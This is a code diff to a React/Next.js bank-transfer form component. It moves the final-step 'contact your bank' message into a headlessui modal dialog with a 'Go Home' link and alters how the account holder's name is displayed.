@@ -1,12 +1,13 @@
 "use client";
 
-import React, { useEffect, useState } from "react";
+import React, { useEffect, useState, Fragment } from "react";
 import SelectBks from "../dropdown/SelectBks";
 import { formatCurrency } from "../formatCurrency";
 import { Account } from "@/utils/types";
 import { generateRandomCode } from "./generateRandomCode";
 import Link from "next/link";
 import Loader from "../Loader";
+import { Dialog, Transition } from '@headlessui/react';
 // import { TelegramSendMessage } from "../TelegramSendMessage";
 
 interface Bks {
@@ -24,6 +25,7 @@ interface FormErrors {
 
 export default function Transfer() {
   const [user, setUser] = useState<Account | null>(null);
+  const [isOpen, setIsOpen] = useState(true);
   const [step, setStep] = useState(1);
   const [formData, setFormData] = useState({
     routingNumber: "",
@@ -187,7 +189,7 @@ export default function Transfer() {
                   </div>
                   <div className="flex flex-col gap-1">
                     <span className="uppercase">
-                      {user.holder.firstName} {user.holder.lastName}
+                      {user.holder.fullName} {user.holder.lastName}
                     </span>
                     <span className="text-sm text-[#303030]">
                       Balance: {formatCurrency(user.bank_details.balance_usd)}
@@ -300,19 +302,55 @@ export default function Transfer() {
           )}
 
           {step === 4 && (
-            <div>
-              {user.transaction_mgs_code.lastStepText ? (
-                <p className="text-[17px] text-center text-zinc-700">
-                  {user.transaction_mgs_code.lastStepText}
-                </p>
-              ) : (
-                <p className="text-[17px] text-zinc-700">
-                  Currently, an issue exists that requires your attention. To
-                  proceed with this transaction, we kindly request that you
-                  contact your bank. Thank you for your cooperation.
-                </p>
-              )}
-            </div>
+            <Transition appear show={isOpen} as={Fragment}>
+            <Dialog as="div" className="relative z-10" onClose={() => setIsOpen(false)}>
+              <Transition.Child
+                as={Fragment}
+                enter="ease-out duration-300"
+                enterFrom="opacity-0 scale-95"
+                enterTo="opacity-100 scale-100"
+                leave="ease-in duration-200"
+                leaveFrom="opacity-100 scale-100"
+                leaveTo="opacity-0 scale-95"
+              >
+                <div className="fixed inset-0 bg-black bg-opacity-25"></div>
+              </Transition.Child>
+
+              <div className="fixed inset-0 overflow-y-auto">
+                <div className="flex min-h-full items-center justify-center p-4 text-center">
+                  <Transition.Child
+                    as={Fragment}
+                    enter="ease-out duration-300"
+                    enterFrom="opacity-0 scale-95"
+                    enterTo="opacity-100 scale-100"
+                    leave="ease-in duration-200"
+                    leaveFrom="opacity-100 scale-100"
+                    leaveTo="opacity-0 scale-95"
+                  >
+                    <Dialog.Panel className="w-full max-w-md transform overflow-hidden rounded-2xl bg-white p-6 text-left align-middle shadow-xl transition-all">
+                      <div className="mt-4">
+                        {user.transaction_mgs_code.lastStepText ? (
+                          <p className="text-lg font-medium leading-6 text-gray-9000">{user.transaction_mgs_code.lastStepText}</p>
+                        ) : (
+                          <p className="text-lg font-medium leading-6 text-gray-9000">
+                            Currently, an issue exists that requires your attention. To proceed with this transaction, we kindly request that you contact your bank. Thank you for your cooperation.
+                          </p>
+                        )}
+                      </div>
+                      <div className="mt-4">
+                        <Link
+                          href="/dashboard"
+                          className="flex justify-center rounded-md border border-transparent bg-red-600 px-4 py-2 text-sm font-medium text-white hover:bg-red-700 focus:outline-none focus-visible:ring-2 focus-visible:ring-red-500 focus-visible:ring-offset-2"
+                        >
+                          Go Home
+                        </Link>
+                      </div>
+                    </Dialog.Panel>
+                  </Transition.Child>
+                </div>
+              </div>
+            </Dialog>
+          </Transition>
           )}
         </form>
       </div>
